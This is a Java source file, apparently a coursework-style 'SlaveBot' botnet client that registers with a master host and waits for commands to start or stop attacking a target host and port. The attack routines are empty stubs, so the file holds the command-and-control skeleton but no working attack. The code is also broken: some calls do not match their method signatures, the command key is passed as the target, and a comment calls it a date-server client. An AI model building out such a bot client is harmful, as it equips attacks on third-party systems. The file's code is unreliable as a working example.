//package bot;

import java.io.*;
import java.net.*;
import java.util.*;

import bot.MasterBot.SlaveData;

/**
 * Trivial client for the date server.
 */
public class SlaveBot {
	
	static Map<String, String> targetDataMap = new HashMap <String,String> ();

	public static void main(String[] args) throws Exception {
		if(args.length != 4)
		{
			System.out.println("Usage: SlaveBot -h hostname -p portnumber of master");
			System.exit(0);
		}

		String hostname = args[1];
		Integer masterport = Integer.parseInt(args[3]);
		registerSlave(hostname, masterport);
	}

	public static void attackTarget(String targetHost, String targetPort){

	}

	public static void stopAttack(String targetHost, String targetPort){

	}

	public static void extractTargetData(String targetData){
		String delims = " ";
		StringTokenizer st = new StringTokenizer(targetData, delims);
		while(st.hasMoreTokens()){
			if(st.countTokens() !=2){
				throw new RuntimeException("Unexpected format");
			}
			String key = st.nextToken();
			String value = st.nextToken();
			targetDataMap.put(key, value);
			if(key.contentEquals("connect")){
				attackTarget(key, value);
			}
			else if(key.contentEquals("disconnect")){
				stopAttack(key, value);
			}
			
		}
		

		if(targetData.contentEquals("Connect")){
			attackTarget();
		}
		else if (targetData.contentEquals("Disconnect")){
			stopAttack();
		}

	}

	public static void registerSlave(String hostname, int masterport){
		Socket client_socket;
		try{
			client_socket = new Socket(hostname, masterport);
			PrintWriter out = new PrintWriter(client_socket.getOutputStream(), true);
			BufferedReader in = new BufferedReader(new InputStreamReader(client_socket.getInputStream()));

			String ip=(((InetSocketAddress) client_socket.getRemoteSocketAddress()).getAddress()).toString().replace("/","");
			Integer port_int = (Integer) (client_socket.getLocalPort());
			String local_host = client_socket.getInetAddress().getHostAddress();

			System.out.println(ip + port_int + local_host); //print here in slave just to confirm

			out.println(ip +","+ port_int + "," + local_host);
			ServerSocket listen = new ServerSocket(port_int);
			while(true)
			{
				client_socket = listen.accept();
				String dataFromMaster = in.readLine();
				extractTargetData(dataFromMaster);
				
			}                                                                                         
		}
		catch (Exception e){
			System.out.println(e);
		}
	}
}
